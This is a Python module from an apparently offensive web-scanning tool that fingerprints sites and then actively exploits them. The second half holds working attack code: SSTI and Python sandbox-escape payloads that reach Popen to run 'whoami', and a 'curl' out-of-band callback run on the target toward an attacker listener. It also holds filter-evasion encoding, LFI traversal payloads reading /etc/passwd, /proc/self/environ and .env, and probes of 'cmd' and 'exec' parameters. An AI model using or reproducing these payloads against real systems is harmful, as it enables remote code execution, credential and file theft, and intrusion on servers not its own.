# app/tools/http_fingerprint.py
import requests
import re
import urllib3
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlparse
from .encoders import decode_javascript_obfuscation, detect_and_decode
from .runtime_user_fingerprint import RuntimeUserFingerprint
from .oob_tester import multi_channel_oob_test
# Import config manager directly
from app.core.config import config as config_manager
from app.core.logger import logger

class HTTPFingerprinter:
    def __init__(self, session=None, progress_callback=None):
        # Only suppress SSL warnings when the user has explicitly disabled
        # certificate verification in config (ssl_verify = False).
        if config_manager.get('security.suppress_ssl_warnings', False):
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.ssl_verify = config_manager.get('security.ssl_verify', True)
        self.plugins = []
        self.progress_callback = progress_callback
        self.is_running = lambda: True  # Default to always running
        self.listener_manager = None
        self._load_plugins()
    
    def _load_plugins(self):
        """Load scan plugins dynamically"""
        try:
            from .scan_plugins import get_available_plugins
            self.plugins = get_available_plugins()
        except (ImportError, AttributeError, Exception) as e:
            # Fallback if scan_plugins not available
            self.plugins = []
    
    def normalize_url(self, url):
        """Normalize URL with proper scheme detection"""
        if not url.startswith(('http://', 'https://')):
            # Try HTTPS first, fallback to HTTP
            try:
                test_url = f"https://{url}"
                response = self.session.head(test_url, timeout=5, verify=self.ssl_verify)
                return test_url
            except:
                return f"http://{url}"
        return url
    
    def parse_response(self, response):
        """Parse HTTP response for key indicators"""
        return {
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'content_length': len(response.content),
            'content_type': response.headers.get('Content-Type', ''),
            'server': response.headers.get('Server', ''),
            'body': response.text if 'text/' in response.headers.get('Content-Type', '') else None
        }
        
    def analyze_headers(self, response):
        """Enhanced header analysis for technology detection"""
        tech_info = {}
        headers = response.headers
        
        # Server identification
        server = headers.get('Server', '')
        tech_info['server'] = server
        
        # Framework detection
        frameworks = {
            'Laravel': ['laravel_session', 'X-RateLimit-Limit'],
            'Express': ['X-Powered-By: Express'],
            'Django': ['X-Frame-Options: DENY', 'csrftoken'],
            'Flask': ['Werkzeug'],
            'ASP.NET': ['X-AspNet-Version', 'X-Powered-By: ASP.NET'],
            'PHP': ['X-Powered-By: PHP', 'PHPSESSID'],
            'WordPress': ['X-Pingback', 'wp-'],
            'Drupal': ['X-Drupal-Cache', 'X-Generator: Drupal']
        }
        
        detected_frameworks = []
        headers_str = str(headers).lower()
        
        for framework, indicators in frameworks.items():
            for indicator in indicators:
                if indicator.lower() in headers_str:
                    detected_frameworks.append(framework)
                    break
        
        tech_info['frameworks'] = detected_frameworks
        
        # Security headers analysis
        security_headers = {
            'X-Frame-Options': headers.get('X-Frame-Options'),
            'X-XSS-Protection': headers.get('X-XSS-Protection'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
            'Content-Security-Policy': headers.get('Content-Security-Policy'),
            'X-Powered-By': headers.get('X-Powered-By')
        }
        
        tech_info['security_headers'] = {k: v for k, v in security_headers.items() if v}
        
        return tech_info
    
    def extract_javascript_files(self, html_content, base_url):
        """Extract and analyze JavaScript files"""
        js_files = []
        
        # Find script tags with src
        script_pattern = r'<script[^>]+src=["\']([^"\']+)["\'][^>]*>'
        matches = re.findall(script_pattern, html_content, re.IGNORECASE)
        
        for src in matches:
            if not src.startswith('http'):
                src = urljoin(base_url, src)
            js_files.append(src)
        
        # Download and analyze JS files
        analyzed_js = []
        for js_url in js_files[:5]:  # Limit to first 5 files
            try:
                response = self.session.get(js_url, timeout=10, verify=self.ssl_verify)
                if response.status_code == 200:
                    js_content = response.text
                    
                    # Look for API endpoints in JS
                    api_endpoints = self.extract_api_endpoints_from_js(js_content)
                    
                    # Store endpoints for SSTI testing
                    if not hasattr(self, '_js_endpoints'):
                        self._js_endpoints = []
                    self._js_endpoints.extend(api_endpoints)
                    
                    # Decode obfuscated content
                    decoded_content = decode_javascript_obfuscation(js_content)
                    
                    # Look for encoded data
                    encoded_data = []
                    for line in js_content.split('\n'):
                        if any(pattern in line for pattern in ['"', "'"]):
                            strings = re.findall(r'["\']([^"\']{20,})["\']', line)
                            for string in strings:
                                decoded = detect_and_decode(string)
                                if decoded:
                                    encoded_data.extend(decoded)
                    
                    analyzed_js.append({
                        'url': js_url,
                        'size': len(js_content),
                        'api_endpoints': api_endpoints,
                        'decoded_content': decoded_content,
                        'encoded_data': encoded_data
                    })
                    
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
        
        return analyzed_js
    
    def extract_api_endpoints_from_js(self, js_content):
        """Extract API endpoints from JavaScript code"""
        endpoints = []
        
        # Common API endpoint patterns
        patterns = [
            r'["\'](/api/[^"\']+)["\']',
            r'["\'](/rest/[^"\']+)["\']',
            r'["\']([^"\']*\.php[^"\']*)["\']',
            r'["\']([^"\']*\.asp[x]?[^"\']*)["\']',
            r'url\s*:\s*["\']([^"\']+)["\']',
            r'endpoint\s*:\s*["\']([^"\']+)["\']',
            r'fetch\s*\(\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            endpoints.extend(matches)
        
        # Remove duplicates and filter
        unique_endpoints = list(set(endpoints))
        filtered_endpoints = [ep for ep in unique_endpoints if len(ep) > 3 and not ep.startswith('http')]
        
        return filtered_endpoints
    
    def parse_web_content(self, html_content, base_url):
        """Parse HTML content for forms, links, and other elements"""
        content_info = {}
        
        # Extract forms
        forms = []
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
        form_matches = re.findall(form_pattern, html_content, re.DOTALL | re.IGNORECASE)
        
        for action, form_content in form_matches:
            # Extract input fields
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            inputs = re.findall(input_pattern, form_content, re.IGNORECASE)
            
            forms.append({
                'action': action if action.startswith('http') else urljoin(base_url, action),
                'inputs': inputs
            })
        
        content_info['forms'] = forms
        self.discovered_forms = forms  # Store for SSTI testing
        
        # Extract links
        links = []
        link_pattern = r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>'
        link_matches = re.findall(link_pattern, html_content, re.IGNORECASE)
        
        for link in link_matches:
            if not link.startswith('http') and not link.startswith('#'):
                full_link = urljoin(base_url, link)
                links.append(full_link)
        
        content_info['links'] = list(set(links))[:20]  # Limit to 20 unique links
        
        # Extract meta information
        meta_info = {}
        meta_patterns = {
            'generator': r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)["\']',
            'description': r'<meta[^>]+name=["\']description["\'][^>]+content=["\']([^"\']+)["\']',
            'keywords': r'<meta[^>]+name=["\']keywords["\'][^>]+content=["\']([^"\']+)["\']'
        }
        
        for key, pattern in meta_patterns.items():
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                meta_info[key] = match.group(1)
        
        content_info['meta'] = meta_info
        
        return content_info
    
    async def run_ai_ssti_scan(self, target_url: str) -> dict:
        """Run AI-driven SSTI scan integration"""
        try:
            from .scan_plugins.ai_ssti_plugin import AISSTIPlugin
            
            ai_plugin = AISSTIPlugin(self.session, self.progress_callback)
            
            # Get discovered endpoints from previous analysis
            js_endpoints = getattr(self, '_js_endpoints', [])
            
            # Run AI scan
            results = await ai_plugin.scan(target_url, js_endpoints)
            
            return {
                'ai_ssti_results': results,
                'scan_summary': ai_plugin.get_scan_summary(results)
            }
            
        except Exception as e:
            return {
                'error': f'AI SSTI scan failed: {str(e)}',
                'ai_ssti_results': {'vulnerabilities': [], 'ai_intelligence': {}}
            }
    
    def check_known_files(self, base_url):
        """Check for known files and directories"""
        known_files = [
            '/robots.txt',
            '/sitemap.xml',
            '/crossdomain.xml',
            '/.htaccess',
            '/web.config',
            '/config.php',
            '/phpinfo.php',
            '/info.php',
            '/test.php',
            '/admin.php',
            '/login.php',
            '/js/inviteapi.min.js',
            '/js/app.js',
            '/js/main.js',
            '/api/swagger.json',
            '/api/openapi.json'
        ]
        
        found_files = []
        
        for file_path in known_files:
            try:
                url = urljoin(base_url, file_path)
                response = self.session.head(url, timeout=5, verify=self.ssl_verify)
                
                if response.status_code == 200:
                    found_files.append({
                        'path': file_path,
                        'url': url,
                        'size': response.headers.get('Content-Length', 'Unknown'),
                        'content_type': response.headers.get('Content-Type', 'Unknown')
                    })
                    
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
        
        return found_files
    
    def comprehensive_fingerprint(self, url):
        """Perform comprehensive HTTP fingerprinting with enhanced detection"""
        url = self.normalize_url(url)
        results = {'url': url, 'plugins': {}}
        total_steps = 10
        current_step = 0
        
        def update_progress(step, message):
            if self.progress_callback:
                self.progress_callback(step, total_steps, message)
        
        try:
            # Initial request
            update_progress(1, "Making initial request")
            response = self.session.get(url, timeout=10, verify=self.ssl_verify)
            parsed_response = self.parse_response(response)
            results.update(parsed_response)
            
            # Enhanced WAF detection
            update_progress(2, "Detecting WAF")
            results['waf_detection'] = self._enhanced_waf_detection(url, response)
            
            # TLS fingerprinting for HTTPS
            update_progress(3, "TLS fingerprinting")
            if url.startswith('https'):
                results['tls_fingerprint'] = self._tls_fingerprint(url)
            
            # Header analysis
            update_progress(4, "Analyzing headers")
            results['technology'] = self.analyze_headers(response)
            
            # Content parsing
            update_progress(5, "Parsing web content")
            if 'text/html' in response.headers.get('Content-Type', ''):
                results['content_analysis'] = self.parse_web_content(response.text, url)
                js_analysis = self.extract_javascript_files(response.text, url)
                results['javascript_analysis'] = js_analysis
                
                # API endpoint matching
                if js_analysis:
                    results['api_matching'] = self._match_api_endpoints(url, js_analysis)
            
            # Known files check
            update_progress(6, "Checking known files")
            results['known_files'] = self.check_known_files(url)
            
            # Run plugins in parallel
            update_progress(7, "Running plugins")
            results['plugins'] = self._run_plugins_parallel(url, response)
            
            # Account detection with SSTI testing
            update_progress(8, "Detecting execution account")
            results['execution_account'] = self.detect_execution_account(url)
            
            # Runtime user fingerprinting - skip if execution account detection found output suppression
            if not results.get('execution_account', {}).get('output_suppressed'):
                update_progress(9, "Runtime user fingerprinting")
                results['runtime_user'] = self.detect_runtime_user(url, response)
            else:
                update_progress(9, "Skipping runtime user (output suppressed)")
                results['runtime_user'] = {'user': None}
            
            update_progress(10, "Fingerprinting complete")
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def _enhanced_waf_detection(self, url, response):
        """Enhanced WAF detection with test payloads"""
        try:
            from .waf_detector import WAFDetector
            detector = WAFDetector()
            
            # Test with malicious payload
            try:
                test_url = f"{url}?test=<script>alert(1)</script>"
                test_response = self.session.get(test_url, timeout=5, verify=self.ssl_verify)
                return detector.detect(response, test_response)
            except Exception:
                return detector.detect(response)
        except (ImportError, Exception):
            # Fallback WAF detection
            return {
                'detected': False,
                'name': 'Unknown',
                'wafs': []
            }
    
    def _tls_fingerprint(self, url):
        """Perform TLS fingerprinting"""
        try:
            from .tls_fingerprint import TLSFingerprinter
            fingerprinter = TLSFingerprinter()
            return fingerprinter.fingerprint(url)
        except (ImportError, Exception):
            # Fallback TLS info
            return {
                'certificate': {'subject': 'Unknown'},
                'tls_version': 'Unknown',
                'cipher_suite': 'Unknown'
            }
    
    def _match_api_endpoints(self, url, js_analysis):
        """Match JS endpoints to accessible APIs"""
        try:
            from .api_matcher import APIMatcher
            
            # Extract endpoints from JS analysis
            endpoints = []
            for js_file in js_analysis:
                endpoints.extend(js_file.get('api_endpoints', []))
            
            if endpoints:
                matcher = APIMatcher(self.session)
                return matcher.match_endpoints(url, endpoints)
            
            return []
        except (ImportError, Exception):
            # Fallback - return empty list
            return []
    
    def _run_plugins_parallel(self, url, response):
        """Run plugins in parallel using threading"""
        import concurrent.futures
        import threading
        
        plugin_results = {}
        
        def run_plugin(plugin):
            try:
                return plugin.name, plugin.scan(url, response, self.session)
            except Exception as e:
                return plugin.name, {'error': str(e)}
        
        # Use ThreadPoolExecutor for parallel execution
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            future_to_plugin = {executor.submit(run_plugin, plugin): plugin for plugin in self.plugins}
            
            for future in concurrent.futures.as_completed(future_to_plugin, timeout=30):
                try:
                    plugin_name, result = future.result()
                    if result:
                        plugin_results[plugin_name] = result
                except Exception as e:
                    plugin = future_to_plugin[future]
                    plugin_results[plugin.name] = {'error': str(e)}
        
        return plugin_results
    
    def basic_fingerprint(self, url):
        """Perform basic fingerprinting (headers + technology detection)"""
        url = self.normalize_url(url)
        results = {'url': url}
        
        try:
            response = self.session.get(url, timeout=10, verify=self.ssl_verify)
            parsed_response = self.parse_response(response)
            results.update(parsed_response)
            results['technology'] = self.analyze_headers(response)
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def extract_user_from_path(self, html):
        """Extract execution account from file path leaks"""
        # Linux-style /home/user/app/...
        m = re.search(r'/home/([a-zA-Z0-9_-]+)/', html)
        if m:
            return m.group(1)
        # Windows-style C:\Users\username\
        m = re.search(r'[A-Z]:\\\\Users\\\\([a-zA-Z0-9_-]+)\\\\', html)
        if m:
            return m.group(1)
        # Windows single backslash
        m = re.search(r'[A-Z]:\\Users\\([a-zA-Z0-9_-]+)\\', html)
        if m:
            return m.group(1)
        return None
    
    def _is_reflected(self, resp_text, expected):
        """Robust reflection detection with multiple heuristics"""
        if not resp_text:
            return False
        if expected in resp_text:
            return True
        import html
        if expected in html.unescape(resp_text):
            return True
        if re.search(r'\b' + re.escape(expected) + r'\b', resp_text):
            return True
        return False
    
    def _encode_payload(self, payload):
        """Apply encoding to evade filters"""
        import urllib.parse
        # URL encode dots and other special chars
        encoded = payload.replace('.', '%2e').replace('_', '%5f')
        # Unicode escape for 's' in 'sys'
        encoded = encoded.replace('sys', 'sy\u0073')
        return encoded
    
    def _random_param(self):
        """Generate random parameter name"""
        import random, string
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=3))
    
    def _extract_username(self, text):
        """Universal username extraction"""
        patterns = [
            r'uid=\d+\(([^)]+)\)',  # Linux id output
            r'([A-Za-z0-9_\-\.@\\\/]{1,64})',  # Universal account format
        ]
        for pattern in patterns:
            m = re.search(pattern, text.strip(), re.MULTILINE)
            if m:
                candidate = m.group(1)
                if candidate.lower() not in ['error', 'none', 'null', 'test', '--'] and len(candidate) > 2:
                    return candidate
        return None
    
    def _get_attacker_ip(self):
        """Get attacker IP for OOB callbacks"""
        try:
            if self.listener_manager:
                # Get IP from active HTTP listener
                active_listeners = self.listener_manager.get_active_listeners()
                for listener in active_listeners:
                    if listener['type'] == 'http':
                        bind_ip = listener.get('bind_ip', '0.0.0.0')
                        if bind_ip != '0.0.0.0':
                            return bind_ip
                        # Fallback to detecting external IP
                        return self._detect_external_ip()
            
            # Fallback to detecting external IP
            return self._detect_external_ip()
        except Exception:
            return '127.0.0.1'  # Last resort fallback
    
    def _detect_external_ip(self):
        """Detect external IP address"""
        try:
            import socket
            # Connect to a remote address to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '127.0.0.1'
    
    def _safe_post(self, url, data, max_fail=1):
        """Attempt POST first; if server closes connection, fall back to GET with query params"""
        from urllib.parse import urlencode
        try:
            resp = self.session.post(url, data=data, timeout=5, verify=self.ssl_verify)
            return resp
        except Exception as e:
            pass
            try:
                resp = self.session.get(f"{url}?{urlencode(data)}", timeout=5, verify=self.ssl_verify)
                return resp
            except Exception as e2:
                pass
                return None
    
    def detect_python_sandbox(self, base_url, param):
        """Detect if target is running Python execution sandbox"""
        test_expressions = [
            ("1+1", "2"),
            ("len('abc')", "3"),
            ("str(42)", "42"),
            ("'test'.upper()", "TEST")
        ]
        
        for expr, expected in test_expressions:
            try:
                from urllib.parse import quote
                encoded_expr = quote(expr, safe='')
                resp = self._safe_post(base_url, {param: encoded_expr})
                if resp and self._is_reflected(resp.text, expected):
                    pass
                    return True
            except:
                continue
        return False
    
    def enumerate_subclasses(self, base_url, param, max_index=30):
        """Enumerate Python object subclasses to find execution primitives"""
        dangerous_classes = ['Popen', 'os._wrap_close', 'HTTPConnection', 'BuiltinImporter']
        found_classes = []
        
        # First get total count
        total_classes = max_index  # Default fallback
        try:
            from urllib.parse import quote
            count_payload = quote("len(()).__class__.__base__.__subclasses__()", safe='')
            resp = self._safe_post(base_url, {param: count_payload})
            if resp:
                count_match = re.search(r'\b(\d+)\b', resp.text)
                if count_match:
                    total_classes = min(int(count_match.group(1)), max_index)
                    pass
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        
        # Enumerate classes by index
        for i in range(min(total_classes, max_index)):
            if not self.is_running():
                break
                
            try:
                from urllib.parse import quote
                name_payload = quote(f"().__class__.__base__.__subclasses__()[{i}].__name__", safe='')
                resp = self._safe_post(base_url, {param: name_payload})
                
                if resp:
                    class_name = resp.text.strip()
                    if any(dangerous in class_name for dangerous in dangerous_classes):
                        found_classes.append((i, class_name))
                        pass
                        
            except Exception as e:
                pass
                continue
        
        return found_classes
    
    def test_ssti_account_detection(self, base_url):
        """Enhanced SSTI detection with Python sandbox escape targeting multiple endpoints"""
        eval_tests = [("{{1+1}}", "2"), ("${1+1}", "2"), ("<%= 1+1 %>", "2")]
        
        pass
        
        # Build target list for SSTI/sandbox payloads
        targets = set()
        targets.add(base_url)
        
        # Add form actions discovered from content parsing
        for form in getattr(self, "discovered_forms", []):
            action = form.get("action")
            if action and action.startswith("/"):
                targets.add(base_url.rstrip("/") + action)
            elif action and action.startswith("http"):
                targets.add(action)
        
        # Add JS-discovered endpoints
        for endpoint in getattr(self, "_js_endpoints", []):
            if endpoint.startswith("/"):
                targets.add(base_url.rstrip("/") + endpoint)
            elif endpoint.startswith("http"):
                targets.add(endpoint)
        
        pass
        
        for _ in range(3):  # Try 3 random params
            if not self.is_running():
                return None
            param = self._random_param()
            
            # Phase 1: Test for Python sandbox FIRST across all targets
            python_sandbox = False
            for target in targets:
                if self.detect_python_sandbox(target, param):
                    python_sandbox = True
                    base_url = target  # Use the working target
                    break
            
            if python_sandbox:
                pass
                
                # Get OOB callback URL using configured bind IP
                callback_url = None
                try:
                    if self.listener_manager:
                        active_listeners = self.listener_manager.get_active_listeners()
                        for listener in active_listeners:
                            if listener['type'] in ('http', 'http_oob'):
                                bind_ip = listener.get('bind_ip', '0.0.0.0')
                                if bind_ip == '0.0.0.0':
                                    bind_ip = self._get_attacker_ip()
                                port = listener.get('port', 80)
                                callback_url = f"http://{bind_ip}:{port}"
                                break
                except Exception as _exc:
                    pass
                    logger.debug("Suppressed exception", exc_info=True)
                
                if callback_url:
                    try:
                        pass
                        import asyncio, aiohttp, random, string, time
                        from urllib.parse import quote
                        
                        async def oob_test():
                            nonce = ''.join(random.choices(string.ascii_lowercase, k=6))
                            oob_url = f"{callback_url.rstrip('/')}/sb_{nonce}"
                            
                            connector = aiohttp.TCPConnector(limit=2, limit_per_host=1)
                            timeout = aiohttp.ClientTimeout(total=3)
                            
                            try:
                                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                                    # Find Popen class quickly
                                    for i in range(40):  # Extended range
                                        try:
                                            payload = f"().__class__.__base__.__subclasses__()[{i}].__name__"
                                            # Send payload TO the target, not to the listener
                                            async with session.post(base_url, data={param: payload}) as resp:
                                                text = await resp.text()
                                                if 'Popen' in text:
                                                    # Send URL-encoded OOB payload
                                                    exec_payload = quote(f"().__class__.__base__.__subclasses__()[{i}](['curl','-s','{oob_url}'])")
                                                    # Send OOB payload TO the target
                                                    await session.post(base_url, data={param: exec_payload})
                                                    return True
                                        except:
                                            continue
                            except Exception as _exc:
                                pass
                                logger.debug("Suppressed exception", exc_info=True)
                            return False
                        
                        try:
                            loop = asyncio.new_event_loop()
                            asyncio.set_event_loop(loop)
                            oob_sent = loop.run_until_complete(oob_test())
                            loop.close()
                            if oob_sent:
                                pass
                                time.sleep(1)  # Brief wait
                        except Exception as e:
                            pass
                            logger.debug("Suppressed exception", exc_info=True)
                    except Exception as _exc:
                        pass
                        logger.debug("Suppressed exception", exc_info=True)
                
                pass
                return {
                    'user': None,
                    'method': 'Python sandbox detected',
                    'sandbox_detected': True,
                    'sandbox_type': 'python',
                    'param': param,
                    'stop_testing': True
                }
            
            # Phase 2: Test for template engine SSTI across all targets
            ssti_detected = False
            working_target = None
            for target in targets:
                for payload, expected in eval_tests:
                    try:
                        from urllib.parse import quote
                        encoded_payload = quote(payload, safe='')
                        # Send payload TO the target, not to the listener
                        resp = self._safe_post(target, {param: encoded_payload})
                        if resp and self._is_reflected(resp.text, expected):
                            pass
                            ssti_detected = True
                            working_target = target
                            break
                    except:
                        continue
                if ssti_detected:
                    break
            
            if ssti_detected and working_target:
                # Traditional SSTI bypass with URL encoding
                bypass_payloads = [
                    "[c for c in (1).__class__.__base__.__subclasses__() if c.__name__=='Quitter'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].popen('whoami').read()",
                    "(lambda:0).__globals__['sy'+'s'].modules['o'+'s'].popen('whoami').read()",
                    '${"freemarker.template.utility.Execute"?new()("whoami")}',
                    "<%= `whoami` %>"
                ]
                
                for payload in bypass_payloads:
                    try:
                        from urllib.parse import quote
                        encoded_payload = quote(payload, safe='')
                        # Send SSTI payload TO the target, not to the listener
                        resp = self._safe_post(working_target, {param: f"{{{{{encoded_payload}}}}}"})
                        if resp:
                            user = self._extract_username(resp.text)
                            if user and user != '--':
                                pass
                                return user
                    except Exception as e:
                        pass
                        continue
                
                # Check for SSTI output suppression
                from urllib.parse import quote
                echo_test = quote("{{().__class__.__base__.__subclasses__()[59]('echo TEST',shell=True,stdout=-1).communicate()[0]}}", safe='')
                try:
                    # Send test payload TO the target, not to the listener
                    resp = self._safe_post(working_target, {param: echo_test})
                    output_suppressed = not resp or ("TEST" not in resp.text and len(resp.text) > 100)
                except:
                    output_suppressed = True
                
                if output_suppressed:
                    pass
                    return {
                        'user': None,
                        'method': 'SSTI sandbox detected', 
                        'sandbox_detected': True,
                        'sandbox_type': 'ssti',
                        'param': param,
                        'stop_testing': True
                    }
            
            # If neither sandbox nor SSTI detected, continue to next param
            if not python_sandbox and not ssti_detected:
                continue
            
            break  # Stop after first successful detection
        
        pass
        return None
    
    def test_lfi_account_detection(self, base_url):
        """Test for LFI and extract account info"""
        lfi_params = ['file', 'path', 'page', 'include', 'template']
        lfi_paths = [
            "../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "../../../../proc/self/environ",
            "../../../../proc/self/status",
            "../../../../proc/self/cmdline",
            "../../../../.env",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "/etc/passwd%00",
            "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        
        pass
        
        for param in lfi_params:
            for path in lfi_paths:
                # Check if scan should stop
                if not self.is_running():
                    return None
                try:
                    response = self.session.get(f"{base_url}?{param}={path}", timeout=5, verify=self.ssl_verify)
                    pass
                    
                    # Handle base64 encoded responses
                    content = response.text
                    if "php://filter" in path and "base64" in path:
                        try:
                            import base64
                            content = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                        except Exception as _exc:
                            pass
                            logger.debug("Suppressed exception", exc_info=True)
                    
                    # Parse /etc/passwd
                    if "root:x:0:0" in content:
                        pass
                        for line in content.splitlines():
                            if any(u in line for u in ['www-data', 'apache', 'nginx', 'tomcat']):
                                user = line.split(':')[0]
                                pass
                                return user
                    
                    # Parse /proc/self/environ
                    if "HOME=" in content or "USER=" in content:
                        pass
                        home_match = re.search(r'HOME=([^\x00]+)', content)
                        if home_match and '/home/' in home_match.group(1):
                            user = home_match.group(1).split('/')[-1]
                            pass
                            return user
                        
                        user_match = re.search(r'USER=([^\x00]+)', content)
                        if user_match:
                            user = user_match.group(1)
                            pass
                            return user
                    
                    # Windows paths
                    if "C:\\Users\\" in content:
                        user_match = re.search(r'C:\\Users\\([^\\]+)\\', content)
                        if user_match:
                            user = user_match.group(1)
                            pass
                            return user
                            
                except Exception as e:
                    pass
                    continue
        
        pass
        return None
    
    def detect_execution_account(self, base_url):
        """Main method to detect web app execution account"""
        account_info = {'user': None, 'method': None, 'confidence': 'low', 'debug': []}
        
        try:
            pass
            
            # 1. Error page fingerprinting - test more paths
            error_urls = [
                f"{base_url}/nonexistent12345.xyz",
                f"{base_url}/static/nonexistent.css",
                f"{base_url}/templates/nonexistent.html",
                f"{base_url}/app/nonexistent.py"
            ]
            
            pass
            for url in error_urls:
                try:
                    response = self.session.get(url, timeout=5, verify=self.ssl_verify)
                    pass
                    user = self.extract_user_from_path(response.text)
                    if user:
                        account_info.update({'user': user, 'method': 'Error page leak', 'confidence': 'high'})
                        pass
                        return account_info
                except Exception as e:
                    pass
                    continue
            
            # 2. SSTI testing (enhanced)
            pass
            ssti_result = self.test_ssti_account_detection(base_url)
            
            if isinstance(ssti_result, dict) and ssti_result.get('sandbox_detected'):
                pass
                account_info['sandbox_detected'] = True
                account_info['sandbox_type'] = ssti_result.get('sandbox_type')
                account_info['stop_testing'] = True
            elif ssti_result:
                account_info.update({'user': ssti_result, 'method': 'SSTI whoami', 'confidence': 'high'})
                pass
            else:
                pass
            
            # Return if we found either RCE or sandbox
            if account_info.get('user') or account_info.get('sandbox_detected'):
                return account_info
            
            # 3. LFI testing (enhanced)
            pass
            user = self.test_lfi_account_detection(base_url)
            if user:
                account_info.update({'user': user, 'method': 'LFI file read', 'confidence': 'medium'})
                pass
                return account_info
            else:
                pass
                
        except Exception as e:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        
        return account_info
    
    def detect_runtime_user(self, base_url, initial_response):
        """Detect runtime user using generic code execution fingerprinting"""
        fingerprinter = RuntimeUserFingerprint()
        
        def send_code_func(payload):
            # Try multiple injection points
            test_params = ['code', 'input', 'data', 'cmd', 'exec']
            
            # Test root endpoint
            for param in test_params:
                try:
                    # GET request
                    resp = self.session.get(f"{base_url}?{param}={payload}", timeout=5, verify=self.ssl_verify)
                    if len(resp.text) > len(initial_response.text) + 10:  # Response changed significantly
                        return resp.text
                    
                    # Safe POST request
                    resp = self._safe_post(base_url, {param: payload})
                    if resp and len(resp.text) > len(initial_response.text) + 10:
                        return resp.text
                        
                except Exception:
                    continue
            
            # Try discovered endpoints from JavaScript analysis
            try:
                # Get JS endpoints from comprehensive fingerprint if available
                js_analysis = getattr(self, '_js_endpoints', [])
                for endpoint in js_analysis[:3]:  # Test first 3 endpoints
                    if endpoint.startswith('/'):
                        endpoint_url = f"{base_url.rstrip('/')}{endpoint}"
                        for param in ['code', 'input']:
                            try:
                                resp = self._safe_post(endpoint_url, {param: payload})
                                if resp and len(resp.text) > 100:  # Has substantial response
                                    return resp.text
                            except:
                                continue
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
            
            return ""
        
        try:
            runtime_user = fingerprinter.run(send_code_func)
            return {'user': runtime_user, 'method': 'Runtime execution'} if runtime_user else {'user': None}
        except Exception:
            return {'user': None}